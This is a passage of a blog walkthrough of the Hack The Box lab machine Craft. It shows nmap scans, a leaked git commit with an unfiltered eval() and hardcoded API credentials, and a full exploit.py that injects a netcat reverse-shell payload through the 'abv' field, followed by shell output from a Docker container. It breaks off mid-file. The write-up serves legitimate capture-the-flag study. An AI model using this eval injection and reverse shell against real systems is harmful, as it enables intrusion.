<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Craft - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Craft from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Craft">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/craft/">


  <meta property="og:description" content="My write-up / walkthrough for Craft from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Craft">
  <meta name="twitter:description" content="My write-up / walkthrough for Craft from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/craft/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2020-01-04T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/craft/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Craft">
    <meta itemprop="description" content="Hack The Box - Craft">
    <meta itemprop="datePublished" content="2020-01-04T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/craft/" class="u-url" itemprop="url">Hack The Box - Craft
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2020-01-04T07:00:00+02:00">January 4, 2020</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          9 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---craft">Hack The Box - Craft</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#web-enumeration">Web Enumeration</a></li>
<li><a href="#rce--shell-on-docker-container">RCE –&gt; Shell on Docker Container</a></li>
<li><a href="#gilfoyles-gogs-credentials--ssh-key--ssh-as-gilfoyle--user-flag">Gilfoyle’s Gogs Credentials –&gt; SSH Key –&gt; SSH as Gilfoyle –&gt; User Flag</a></li>
<li><a href="#vault--one-time-ssh-password--ssh-as-root--root-flag">Vault –&gt; One-Time SSH Password –&gt; SSH as root –&gt; Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---craft">Hack The Box - Craft</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys, today Craft retired and here’s my write-up about it. It’s a medium rated Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.110</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">craft.htb</code>. Let’s jump right in !</p>

<p><br><img src="/images/hackthebox/craft/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/craft# nmap -sV -sT -sC -o nmapinitial craft.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-03 13:41 EST
Nmap scan report for craft.htb (10.10.10.110)
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.97 seconds
root@kali:~/Desktop/HTB/boxes/craft# 
</code></pre></div></div>
<p>We got <code class="language-plaintext highlighter-rouge">https</code> on port 443 and <code class="language-plaintext highlighter-rouge">ssh</code> on port 22.<br></p>

<h2 id="web-enumeration">Web Enumeration</h2>
<p>The home page was kinda empty, Only the about info and nothing else:
<br><img src="/images/hackthebox/craft/1.png" alt="" class="align-center"><br><br>
The navigation bar had two external links, one of them was to <code class="language-plaintext highlighter-rouge">https://api.craft.htb/api/</code> and the other one was to <code class="language-plaintext highlighter-rouge">https://gogs.craft.htb</code>:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"nav navbar-nav pull-right"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://api.craft.htb/api/"</span><span class="nt">&gt;</span>API<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
            <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://gogs.craft.htb/"</span><span class="nt">&gt;&lt;img</span> <span class="na">border=</span><span class="s">"0"</span> <span class="na">alt=</span><span class="s">"Git"</span> <span class="na">src=</span><span class="s">"/static/img/Git-Icon-Black.png"</span> <span class="na">width=</span><span class="s">"20"</span> <span class="na">height=</span><span class="s">"20"</span><span class="nt">&gt;&lt;/a&gt;&lt;/li&gt;</span>
          <span class="nt">&lt;/ul&gt;</span>
</code></pre></div></div>
<p>So I added both of <code class="language-plaintext highlighter-rouge">api.craft.htb</code> and <code class="language-plaintext highlighter-rouge">gogs.craft.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> then I started checking them.<br>
<code class="language-plaintext highlighter-rouge">https://api.craft.htb/api</code>:
<br><img src="/images/hackthebox/craft/2.png" alt="" class="align-center"><br><br></p>

<p>Here we can see the <code class="language-plaintext highlighter-rouge">API</code> endpoints and how to interact with them.<br>
We’re interested in the authentication part for now, there are two endpoints, <code class="language-plaintext highlighter-rouge">/auth/check</code> which checks the validity of an authorization token and <code class="language-plaintext highlighter-rouge">/auth/login</code> which creates an authorization token provided valid credentials.<br></p>

<p><br><img src="/images/hackthebox/craft/3.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/craft/4.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/craft/5.png" alt="" class="align-center"><br><br>
We don’t have credentials to authenticate so let’s keep enumerating.<br>
Obviously <code class="language-plaintext highlighter-rouge">gogs.craft.htb</code> had <code class="language-plaintext highlighter-rouge">gogs</code> running:
<br><img src="/images/hackthebox/craft/6.png" alt="" class="align-center"><br><br></p>

<p>The repository of the <code class="language-plaintext highlighter-rouge">API</code> source code was publicly accessible so I took a look at the code and the commits.<br></p>

<p><br><img src="/images/hackthebox/craft/7.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/craft/8.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/craft/9.png" alt="" class="align-center"><br><br>
Dinesh’s commits <code class="language-plaintext highlighter-rouge">c414b16057</code> and <code class="language-plaintext highlighter-rouge">10e3ba4f0a</code> had some interesting stuff. First one had some code additions to <code class="language-plaintext highlighter-rouge">/brew/endpoints/brew.py</code> where user’s input is being passed to <code class="language-plaintext highlighter-rouge">eval()</code> without filtering:
<br><img src="/images/hackthebox/craft/10.png" alt="" class="align-center"><br><br></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@@</span> <span class="o">-</span><span class="mi">38</span><span class="p">,</span><span class="mi">9</span> <span class="o">+</span><span class="mi">38</span><span class="p">,</span><span class="mi">13</span> <span class="o">@@</span> <span class="k">class</span> <span class="nc">BrewCollection</span><span class="p">(</span><span class="n">Resource</span><span class="p">):</span>
         <span class="s">"""
         Creates a new brew entry.
         """</span>
<span class="o">-</span>
<span class="o">-</span>        <span class="n">create_brew</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">)</span>
<span class="o">-</span>        <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">201</span>
<span class="o">+</span>
<span class="o">+</span>        <span class="c1"># make sure the ABV value is sane.
</span><span class="o">+</span>        <span class="k">if</span> <span class="nb">eval</span><span class="p">(</span><span class="s">'%s &gt; 1'</span> <span class="o">%</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]):</span>
<span class="o">+</span>            <span class="k">return</span> <span class="s">"ABV must be a decimal value less than 1.0"</span><span class="p">,</span> <span class="mi">400</span>
<span class="o">+</span>        <span class="k">else</span><span class="p">:</span>
<span class="o">+</span>            <span class="n">create_brew</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">)</span>
<span class="o">+</span>            <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">201</span>
 <span class="o">@</span><span class="n">ns</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/&lt;int:id&gt;'</span><span class="p">)</span>
 <span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">response</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span> <span class="s">'Brew not found.'</span><span class="p">)</span>
</code></pre></div></div>
<p>I took a look at the <code class="language-plaintext highlighter-rouge">API</code> documentation again to find in which request I can send the <code class="language-plaintext highlighter-rouge">abv</code> parameter:
<br><img src="/images/hackthebox/craft/11.png" alt="" class="align-center"><br><br></p>

<p>As you can see we can send a <code class="language-plaintext highlighter-rouge">POST</code> request to <code class="language-plaintext highlighter-rouge">/brew</code> and inject our payload in the parameter <code class="language-plaintext highlighter-rouge">abv</code>, However we still need an authorization token to be able to interact with <code class="language-plaintext highlighter-rouge">/brew</code>, and we don’t have any credentials.<br>
The other commit was a test script which had hardcoded credentials, exactly what we need:
<br><img src="/images/hackthebox/craft/12.png" alt="" class="align-center"><br><br></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'dinesh'</span><span class="p">,</span> <span class="s">'4aUh0A8PbVJxgd'</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="o">+</span><span class="n">json_response</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
<span class="o">+</span><span class="n">token</span> <span class="o">=</span>  <span class="n">json_response</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>
<span class="o">+</span>
<span class="o">+</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'X-Craft-API-Token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>  <span class="p">}</span>
<span class="o">+</span>
<span class="o">+</span><span class="c1"># make sure token is valid
</span><span class="o">+</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/check'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="o">+</span><span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
<span class="o">+</span>
</code></pre></div></div>
<p>I tested the credentials and they were valid:
<br><img src="/images/hackthebox/craft/13.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/craft/14.png" alt="" class="align-center"><br><br></p>

<h2 id="rce--shell-on-docker-container">RCE –&gt; Shell on Docker Container</h2>
<p>I wrote a small script to authenticate, grab the token, exploit the vulnerability and spawn a shell.<br>
<code class="language-plaintext highlighter-rouge">exploit.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3 
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">Popen</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>

<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>
<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span> 

<span class="k">def</span> <span class="nf">get_token</span><span class="p">():</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'dinesh'</span><span class="p">,</span> <span class="s">'4aUh0A8PbVJxgd'</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
	<span class="n">token</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>
	<span class="k">return</span> <span class="n">token</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
	<span class="n">tmp</span> <span class="o">=</span> <span class="p">{}</span>

	<span class="n">tmp</span><span class="p">[</span><span class="s">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
	<span class="n">tmp</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"pwned"</span>
	<span class="n">tmp</span><span class="p">[</span><span class="s">'brewer'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"pwned"</span>
	<span class="n">tmp</span><span class="p">[</span><span class="s">'style'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"pwned"</span>
	<span class="n">tmp</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc {} {} &gt;/tmp/f')"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>

	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Starting listener on port {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
	<span class="n">Popen</span><span class="p">([</span><span class="s">"nc"</span><span class="p">,</span><span class="s">"-lvnp"</span><span class="p">,</span><span class="n">port</span><span class="p">])</span>

	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Sending payload"</span><span class="p">)</span>
	<span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/brew/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'X-Craft-API-Token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[!] Usage: {} [IP] [PORT]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
	<span class="nb">exit</span><span class="p">()</span>

<span class="n">ip</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Authenticating"</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">get_token</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] Token: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">token</span><span class="p">))</span>
<span class="n">exploit</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</code></pre></div></div>

<p><br><img src="/images/hackthebox/craft/15.png" alt="" class="align-center"><br><br>
Turns out that the application was hosted on a docker container and I didn’t get a shell on the actual host.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/app # cd /
/ # ls -la
total 64
drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
drwxr-xr-x    1 root     root          4096 Jan  3 17:20 bin
drwxr-xr-x    5 root     root           340 Jan  3 14:58 dev
drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc
drwxr-xr-x    2 root     root          4096 Jan 30  2019 home
drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib
drwxr-xr-x    5 root     root          4096 Jan 30  2019 media
drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt
drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt
dr-xr-xr-x  238 root     root             0 Jan  3 14:58 proc
drwx------    1 root     root          4096 Jan  3 15:16 root
drwxr-xr-x    2 root     root          4096 Jan 30  2019 run
drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin
drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv
dr-xr-xr-x   13 root     root             0 Jan  3 14:58 sys
drwxrwxrwt    1 root     root          4096 Jan  3 17:26 tmp
drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr
drwxr-xr-x    1 root     root          4096 Jan 30  2019 var
/ #
</code></pre></div></div>

<h2 id="gilfoyles-gogs-credentials--ssh-key--ssh-as-gilfoyle--user-flag">Gilfoyle’s Gogs Credentials –&gt; SSH Key –&gt; SSH as Gilfoyle –&gt; User Flag</h2>
<p>In <code class="language-plaintext highlighter-rouge">/opt/app</code> there was a python script called <code class="language-plaintext highlighter-rouge">dbtest.py</code>, It connects to the database and executes a <code class="language-plaintext highlighter-rouge">SQL</code> query:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">app</span> <span class="c1"># ls -la
</span><span class="n">total</span> <span class="mi">44</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">5</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jan</span>  <span class="mi">3</span> <span class="mi">17</span><span class="p">:</span><span class="mi">28</span> <span class="p">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="p">..</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">8</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">8</span>  <span class="mi">2019</span> <span class="p">.</span><span class="n">git</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>            <span class="mi">18</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2019</span> <span class="p">.</span><span class="n">gitignore</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">1585</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2019</span> <span class="n">app</span><span class="p">.</span><span class="n">py</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">5</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2019</span> <span class="n">craft_api</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>           <span class="mi">673</span> <span class="n">Feb</span>  <span class="mi">8</span>  <span class="mi">2019</span> <span class="n">dbtest</span><span class="p">.</span><span class="n">py</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">2</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2019</span> <span class="n">tests</span>
<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">app</span> <span class="c1"># cat dbtest.py
#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">pymysql</span>
<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>

<span class="c1"># test connection to mysql database
</span>
<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="p">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="p">.</span><span class="n">cursors</span><span class="p">.</span><span class="n">DictCursor</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span> 
    <span class="k">with</span> <span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
